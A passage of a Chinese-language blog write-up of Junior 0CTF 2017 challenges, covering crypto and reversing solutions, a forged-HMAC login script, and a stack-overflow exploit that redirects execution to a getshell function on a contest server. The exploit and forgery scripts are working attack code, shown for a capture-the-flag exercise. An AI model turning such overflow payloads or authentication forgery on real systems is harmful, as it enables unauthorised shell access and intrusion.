[&apos;\x00&apos;,&apos;\x01&apos;,&apos;\x02&apos;, &apos;\x03&apos;, &apos;\x06&apos;, &apos;\x07&apos;, &apos;\x08&apos;, &apos;\x09&apos;, &apos;\x0a&apos;, &apos;\x0b&apos;]</span><br><span class="line">length = 42</span><br><span class="line">session = requests.Session()</span><br><span class="line">for length in range(43):</span><br><span class="line">        # say origin len &lt; 43</span><br><span class="line">        origin_len = length + 12</span><br><span class="line">        padding_len = (56 - origin_len)</span><br><span class="line">        padding = &quot;\x80&quot; + &quot;\x00&quot; * (padding_len-1)</span><br><span class="line">        checksum = bytearr[origin_len % 32] + bitarr[origin_len / 32] + &apos;\x00&apos;*6</span><br><span class="line">        hmac = padding + checksum</span><br><span class="line">        payload = &#123;&apos;username&apos;: &apos;admin&apos;, &apos;password&apos;: &apos;admin&apos;+padding + checksum&#125;</span><br><span class="line">        cookie = &#123;&apos;hmac&apos;: &quot;5f1b36f358a22a9abe395cba54f6d3bc&quot;&#125;</span><br><span class="line">        r = session.post(&quot;http://202.121.178.201:8081/&quot;, cookies=cookie, data=payload)</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure>
<p></p><p id="j7"></p><p></p>
<h3 id="7-Eva-200"><a href="#7-Eva-200" class="headerlink" title="7.Eva 200"></a>7.Eva 200</h3><p>此题出了bug，直接爆出了答案，没有认真做。</p>
<p>For fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}</p>
<p></p><p id="j8"></p><p></p>
<h3 id="8-babyre-100"><a href="#8-babyre-100" class="headerlink" title="8.babyre 100"></a>8.babyre 100</h3><p>题目给出一个pyc文件[<a href="https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc" target="_blank" rel="noopener">encrypt.pyc</a>]，使用在线工具反编译一下[<a href="http://tools.bugscaner.com/decompyle/" target="_blank" rel="noopener">decompyle</a>]，得到python源文件，内容如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5raw</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytearray(md5(s).digest())</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a) == len(b)</span><br><span class="line">    <span class="keyword">return</span> bytearray([ i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(a, b) ])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">flag = bytearray(raw_input(<span class="string">'Show me your flag: '</span>))</span><br><span class="line"><span class="keyword">assert</span> len(flag) == <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag[:<span class="number">16</span>] = xor(flag[:<span class="number">16</span>], md5raw(flag[<span class="number">16</span>:]))</span><br><span class="line">    flag[:<span class="number">16</span>], flag[<span class="number">16</span>:] = flag[<span class="number">16</span>:], flag[:<span class="number">16</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">'\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1&lt;\xa9\\A\xde\xd22\n'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Right!'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Wrong!'</span></span><br></pre></td></tr></table></figure>
<p>这个看代码是典型的Feistel加密，Feistel结构如下，每轮涉及异或与互换，解密就是把过程逆回去。</p>
<p><img src="/images/in-post/post-blog-jserv11.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5raw</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytearray(md5(s).digest())  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a) == len(b)</span><br><span class="line">    <span class="keyword">return</span> bytearray([ i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(a, b) ])</span><br><span class="line">flag = bytearray(<span class="string">'\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1&lt;\xa9\\A\xde\xd22\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag[<span class="number">16</span>:] = xor(flag[<span class="number">16</span>:], md5raw(flag[:<span class="number">16</span>]))</span><br><span class="line">    flag[:<span class="number">16</span>], flag[<span class="number">16</span>:] = flag[<span class="number">16</span>:], flag[:<span class="number">16</span>]</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">&gt;&gt;flag&#123;<span class="number">1</span>nt3re5tiNg_F3iste1_ciPh3R&#125;</span><br></pre></td></tr></table></figure>
<p></p><p id="j9"></p><p></p>
<h3 id="9-encoder-200"><a href="#9-encoder-200" class="headerlink" title="9.encoder 200"></a>9.encoder 200</h3><p>逆向题目，链接为[<a href="https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip" target="_blank" rel="noopener">encoder.zip</a>]，解压后一个名为encoder的可执行文件，一个加密后的flag”KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd=”。执行encoder，发现就是一个加密算法，输入明文，返回密文。那么解题思路就是找到上述密文对应的明文就是flag。</p>
<p><img src="/images/in-post/post-blog-jserv12.png" alt="img"></p>
<p>使用IDA打开encoder进行分析。<code>main</code>函数如下，主要调用了<code>sub_4006D6()</code>这个函数</p>
<p><img src="/images/in-post/post-blog-jserv13.png" alt="img"></p>
<p>函数<code>sub_4006D6()</code>内容如下，是主要的加密过程</p>
<p><img src="/images/in-post/post-blog-jserv14.png" alt="img"></p>
<p>在函数<code>sub_4006D6()</code>内使用了两个数组（上图红线部分），数组内容如下。注意<code>byte_601080[]</code>第一位为<code>61h</code>是字符a，所以数组内容为<code>&#39;afe7WlyVd12XKLhnqvzQb5B6sNR8gYME&#39;</code>，解题过程中就遇到了所给密文中有a，而找不到a在哪里的尴尬局面。</p>
<p><img src="/images/in-post/post-blog-jserv15.png" alt="img"></p>
<p>反编译出的c代码的问题是变量名不易于理解，需要先来理解<code>sub_4006D6()</code>的主要过程。main函数中变量<code>s</code>为输入字符串的地址，变量<code>v6</code>为字符串的长度。于是可以得到<code>shb_4006D6()</code>函数中变量<code>a1</code>为字符串起始地址，<code>a2</code>为字符串长度。接下来<code>malloc()</code>函数分配空间，应该是给密文分配空间的，从<code>8*(len/5+1)+1</code>可以看出算法是分组加密，每5个字符加密出8个字符。<code>v7</code>是将输入字符的一个分组取出来，重点在到<code>v9[] = byte_601080[v7 &amp; 0x1F]</code>也就是取<code>v7</code>的后5位去<code>byte_601080[]</code>中查询一个字符出来反向放置作为加密结果。对于不满足5位的情况在，算法会在后面补上“=”。下面给出一个修改过变量名的版本，易于理解。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">fastcall <span class="title">sub_4006D6</span><span class="params">(<span class="keyword">unsigned</span> __int64 messagePtr, <span class="keyword">signed</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+14h] [bp-2Ch]@4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [sp+14h] [bp-2Ch]@9</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> left_len; <span class="comment">// [sp+18h] [bp-28h]@2</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+1Ch] [bp-24h]@9</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 check_sum; <span class="comment">// [sp+20h] [bp-20h]@2</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 new_message_ptr; <span class="comment">// [sp+28h] [bp-18h]@1</span></span><br><span class="line">  _BYTE *group_secret; <span class="comment">// [sp+30h] [bp-10h]@1</span></span><br><span class="line">  _BYTE *secret; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  secret = <span class="built_in">malloc</span>(<span class="number">8</span> * (len / <span class="number">5</span> + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">  new_message_ptr = messagePtr;</span><br><span class="line">  group_secret = secret;</span><br><span class="line">  <span class="keyword">while</span> ( len + messagePtr &gt; new_message_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    check_sum = <span class="number">0L</span>L;</span><br><span class="line">    left_len = len + messagePtr - new_message_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( left_len &gt; <span class="number">5</span> )</span><br><span class="line">      left_len = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      check_sum &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &lt; left_len )</span><br><span class="line">        check_sum |= *(_BYTE *)(i + new_message_ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = dword_6010B0[left_len - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">7</span>; j &gt;= <span class="number">0</span>; --j )</span><br><span class="line">    &#123;</span><br><span class="line">      group_secret[j] = byte_601080[check_sum &amp; <span class="number">0x1F</span>];</span><br><span class="line">      check_sum &gt;&gt;= <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="built_in">memset</span>(&amp;group_secret[<span class="number">8L</span>L - v6], <span class="number">61</span>, v6);</span><br><span class="line">    new_message_ptr += <span class="number">5L</span>L;</span><br><span class="line">    group_secret += <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *group_secret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> secret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么解密过程就是，对于密文的每8个字符的分组，去<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">def decode(secret):</span><br><span class="line">    table = &apos;afe7WlyVd12XKLhnqvzQb5B6sNR8gYME&apos;</span><br><span class="line">    message = [0]*40</span><br><span class="line">    string = [&apos;&apos;]*5</span><br><span class="line"></span><br><span class="line">    for i, ch in enumerate(secret):</span><br><span class="line">        index = table.index(ch)</span><br><span class="line">        print(index)</span><br><span class="line">        start = (8-i)*5-5</span><br><span class="line">        while index!=0:</span><br><span class="line">            message[start] = index % 2</span><br><span class="line">            #print (message,start,index)</span><br><span class="line">            index &gt;&gt;= 1</span><br><span class="line">            start += 1</span><br><span class="line"></span><br><span class="line">    for i in range(5):</span><br><span class="line">        num = 0</span><br><span class="line">        for j in range(i*8+7, i*8-1, -1):</span><br><span class="line">            num &lt;&lt;= 1</span><br><span class="line">            num += message[j]</span><br><span class="line">        string[i] = chr(num)</span><br><span class="line">    print(string)</span><br><span class="line">    return string[::-1]</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join(decode(&quot;KNByeN88&quot;)+decode(&quot;KqslM52E&quot;)+decode(&quot;1L67aYRE&quot;)+decode(&quot;K1qQ2N1Q&quot;)+decode(&quot;ydYlaEd&quot;)))</span><br><span class="line"></span><br><span class="line">&gt;&gt;flag&#123;d0_U_Kn0w_ba5e32:P&#125;</span><br></pre></td></tr></table></figure></p>
<p>最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64</p>
<p></p><p id="j10"></p><p></p>
<h3 id="10-seabreeze’s-stack-100"><a href="#10-seabreeze’s-stack-100" class="headerlink" title="10.seabreeze’s stack 100"></a>10.seabreeze’s stack 100</h3><p>题目内容为“nc 202.121.178.181 12321”与一个下载链接[<a href="https://ctf.0ops.sjtu.cn/attachment/download/stack" target="_blank" rel="noopener">stack_55a49bdfcdafd0c31657649e905486a4</a>]，得到一个名为stack的二进制文件。使用strings指令查看一下内部字符内容</p>
<p><img src="/images/in-post/post-blog-jserv16.png" alt="img"></p>
<p>可以看到Shell Gotten与三个问题。执行nc指令</p>
<p><img src="/images/in-post/post-blog-jserv17.png" alt="img"></p>
<p>需要回答的问题与文件中的内容一致，但是之后还需要输入内容。根据上文的Sell Gotten，显然这里我们需要得到shell的控制权，再根据题目名字stack，考虑为栈溢出问题。</p>
<p>使用IDA-win32打开，main函数的主体是work函数，work函数如下，就是之前要回答的三个问题。</p>
<p><img src="/images/in-post/post-blog-jserv18.png" alt="img"></p>
<p>还有一个没有用到的函数getshell()</p>
<p><img src="/images/in-post/post-blog-jserv19.png" alt="img"></p>
<p>只需要程序的返回地址为getshell()的地址，就会触发执行了。查询得到getshell的起始地址为0804 85cb</p>
<p><img src="/images/in-post/post-blog-jserv20.png" alt="img"></p>
<p>栈溢出的原理可以参考链接[<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic.html" target="_blank" rel="noopener">栈溢出</a>]</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = zio((<span class="string">'202.121.178.181'</span>, <span class="number">12321</span> ))</span><br><span class="line">io.read_until(<span class="string">'Do you want to get acquainted with top experts and like-minded friends in computer security?'</span>)  </span><br><span class="line">io.writeline(<span class="string">'Yes!'</span>)  </span><br><span class="line">io.read_until(<span class="string">'Do you want to stride forwards on the road of hacking and explore endless possibilities?'</span>)  </span><br><span class="line">io.writeline(<span class="string">'Yes!!'</span>)</span><br><span class="line">io.read_until(<span class="string">'Do you want to challenge world cutting-edge technology and compete with outstanding hackers?'</span>)</span><br><span class="line">io.writeline(<span class="string">'Yes!!!'</span>)</span><br><span class="line">success_addr = <span class="number">0x080485cb</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x3fc</span> + <span class="string">"bbbb"</span> + p32(success_addr)</span><br><span class="line">io.writeline(payload)  </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>运行代码<br><img src="/images/in-post/post-blog-jserv21.png" alt="img"></p>
<p>cd 进入 /home/…/stack 目录，cat 显示flag。<br><img src="/images/in-post/post-blog-jserv22.png" alt="img"></p>
<h2 id="Have-Idea"><a href="#Have-Idea" class="headerlink" title="Have Idea"></a>Have Idea</h2><p></p><p id="j11"></p><p></p>
<h3 id="11-aes-duet"><a href="#11-aes-duet" class="headerlink" title="11.aes-duet"></a>11.aes-duet</h3><p>题目描述为一个链接[<a href="https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip" target="_blank" rel="noopener">aes_duet.zip</a>]，解压得到一个密文和加密函数，文件如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dummy_key_extend</span><span class="params">(k)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(k) == <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> k * <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_duet</span><span class="params">(plain, key)</span>:</span></span><br><span class="line">    <span class="comment"># It is so safe that I use AES twice here!</span></span><br><span class="line">    <span class="keyword">assert</span> len(key) == <span class="number">8</span></span><br><span class="line">    k1 = dummy_key_extend(key[:<span class="number">4</span>])</span><br><span class="line">    k2 = dummy_key_extend(key[<span class="number">4</span>:])</span><br><span class="line">    c1 = AES.new(k1, AES.MODE_ECB)</span><br><span class="line">    c2 = AES.new(k2, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> c2.encrypt(c1.encrypt(plain))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./secretkey'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        key = f.read()</span><br><span class="line">    <span class="comment"># To make life easier...</span></span><br><span class="line">    <span class="keyword">assert</span> (key.encode(<span class="string">'hex'</span>))[<span class="number">0</span>] == <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">assert</span> (key.encode(<span class="string">'hex'</span>))[<span class="number">-1</span>] == <span class="string">'8'</span></span><br><span class="line">    </span><br><span class="line">    plain = <span class="string">'I am a piece of lovely plaintext'</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'ciphertext'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(aes_duet(plain, key))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"I am a lovely flag: flag&#123; %s&#125;"</span> % key.encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<p>思路很简单，就是AES两轮加密的中间相遇攻击，虽然题目为了降低复杂性提示了key的第一位为0最后一位为8，但是计算量还是十分庞大，需要很多内存，而且计算出来中间值后，查询也会耗时，加上心里的“B树”和“B+树”早忘的没影了，最终因为时间与硬件原因放弃。</p>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>程序的安全性与正确性同等重要。</p>
<p>我们在众多bug中微妙的生活着。</p>
<p>PHP是世界上最好的语言。</p>
<p><img src="/images/in-post/post-blog-j0serv8.gif" alt="img"></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/research/">Research</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solved"><span class="toc-number">2.</span> <span class="toc-text">Solved</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-QQ-Group-50"><span class="toc-number">2.1.</span> <span class="toc-text">0.QQ Group 50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Mystery-Numbers-100"><span class="toc-number">2.2.</span> <span class="toc-text">1.Mystery Numbers 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Easy-Traffic-Analyze-200"><span class="toc-number">2.3.</span> <span class="toc-text">2.Easy Traffic Analyze 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-AES-server-100"><span class="toc-number">2.4.</span> <span class="toc-text">3.AES-server 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-babyrsa-100"><span class="toc-number">2.5.</span> <span class="toc-text">4.babyrsa 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Shatter-Sha512-150"><span class="toc-number">2.6.</span> <span class="toc-text">5.Shatter Sha512! 150</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Penetrate-In-150"><span class="toc-number">2.7.</span> <span class="toc-text">6.Penetrate In 150</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#心路历程："><span class="toc-number">2.7.1.</span> <span class="toc-text">心路历程：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解题思路："><span class="toc-number">2.7.2.</span> <span class="toc-text">解题思路：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Eva-200"><span class="toc-number">2.8.</span> <span class="toc-text">7.Eva 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-babyre-100"><span class="toc-number">2.9.</span> <span class="toc-text">8.babyre 100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-encoder-200"><span class="toc-number">2.10.</span> <span class="toc-text">9.encoder 200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-seabreeze’s-stack-100"><span class="toc-number">2.11.</span> <span class="toc-text">10.seabreeze’s stack 100</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Have-Idea"><span class="toc-number">3.</span> <span class="toc-text">Have Idea</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-aes-duet"><span class="toc-number">3.1.</span> <span class="toc-text">11.aes-duet</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#感想"><span class="toc-number">4.</span> <span class="toc-text">感想</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://miyunluo.com/2017/12/10/jun0ctf/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://miyunluo.com/2017/12/10/jun0ctf/&text=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://miyunluo.com/2017/12/10/jun0ctf/&is_video=false&description=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Junior 0CTF 2017 WriteUp (部分)&body=Check out this article: http://miyunluo.com/2017/12/10/jun0ctf/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://miyunluo.com/2017/12/10/jun0ctf/&title=Junior 0CTF 2017 WriteUp (部分)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://miyunluo.com/2017/12/10/jun0ctf/&name=Junior 0CTF 2017 WriteUp (部分)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Yudong Luo
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/research/">Research</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-102635433-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


<!-- Mathjax -->

  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>
  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>
  <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


